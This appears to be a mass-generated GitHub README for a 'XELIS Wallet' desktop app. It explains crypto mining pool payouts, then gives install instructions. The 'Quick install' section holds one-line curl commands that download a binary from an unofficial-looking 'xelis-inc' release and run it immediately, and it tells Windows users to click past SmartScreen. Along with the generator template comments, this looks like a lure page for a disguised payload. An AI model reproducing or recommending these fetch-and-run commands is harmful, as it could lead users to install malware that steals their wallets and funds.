![XELIS Wallet and mining payouts](assets/banner-article.png)
# XELIS Wallet and mining payouts

Use a wallet address as the payout destination and know what to check when it is late.

## Downloads - Mining

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> A payout address is a receiving address. Never give a pool a phrase, a password or a wallet file.

Point your pool or solo miner at a receiving address from XELIS Wallet, confirm it pays on the XELIS network, and expect the payout as an incoming transaction once the pool sends it and a node reports it.

<!-- ARTICLE-BODY-BEGIN -->
## What a pool payout actually is

A mining pool payout is the pool's batched transfer of mined XEL to each miner's account, sent as an ordinary on-chain transaction. From the wallet's side there is nothing special about it: it arrives at an address, shows as pending, then confirms like any other payment.

That framing answers most payout questions before they are asked. If the wallet has the right address and a working node connection, the payout either has been sent or it has not, and the chain says which.

## Get an address the pool accepts

Open the receive view in the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a>, copy the address, and use it as the payout destination in the pool's settings. Use the plain address unless the pool explicitly demands another form, and check the network setting: a payout sent on a different network will not appear in this wallet.

Copy rather than retype. A payout address pasted with one wrong character sends the pool's money to an address nobody controls. <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-receive-address-qr-code.md">Receive XEL in XELIS Wallet</a> covers the copy step and the QR alternative.

## Why a payout has not appeared

Three causes account for almost every case. The pool has not reached its payout threshold, so nothing has been sent yet. The pool sent it and the transaction is still pending. Or the wallet cannot see the chain because its node connection is down, which makes a completed payout look missing.

Check the address against the pool's record of your account first, then the wallet's sync state. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md">Run a local XELIS node</a> is the durable fix when a public endpoint keeps failing, and it removes the third cause permanently.

## What this article will not do

It will not recommend a pool, quote a payout threshold or estimate what your hardware earns. Those numbers depend on the pool and on the network, they change, and a figure published here would be wrong within a month.

For the algorithm and what commodity hardware can do with it, <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-xelishash-cpu-mining.md">Xelishash CPU mining</a> is the place to start. The wallet's role ends at holding the address and showing the arrival.

## FAQ
### How do I get mining payouts into XELIS Wallet?
Use an address from the wallet's receive view as the pool payout address, confirm the pool pays on the XELIS network, then wait for the pool's transfer to confirm.

### What is a XELIS mining pool payout?
The pool's batched transfer of mined XEL to each miner, sent as a normal transaction to the address that miner supplied.

### Do I need to run a node to receive a payout?
No. A node is needed to see the balance, not to receive the payment; the chain records it either way.

### Can two machines pay out to the same address?
Yes. The address belongs to the wallet, and multiple miners can point at it without conflict.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Xelishash and CPU mining](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-xelishash-cpu-mining.md)
- [Run a local XELIS node](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-run-local-node.md)
- [Receive XEL in XELIS Wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-receive-address-qr-code.md)
- [XELIS Wallet pending transaction](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-transaction-stuck-pending.md)
